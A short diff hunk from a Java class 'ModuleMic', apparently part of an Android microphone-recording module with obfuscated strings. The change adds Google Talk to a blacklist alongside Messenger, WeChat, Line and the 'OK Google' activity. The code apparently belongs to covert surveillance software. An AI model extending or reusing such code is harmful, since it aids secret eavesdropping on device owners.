@@ -105,6 +105,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 		addBlacklist(M.e("com.facebook.orca"));
 		addBlacklist(M.e("com.tencent.mm"));
 		addBlacklist(M.e("jp.naver.line.android"));
+		addBlacklist(M.e("com.google.android.talk"));
 		if (isSpeechRecognitionActivityPresented()) {
 			addBlacklist(Status.OK_GOOGLE_ACTIVITY);
 		} else {
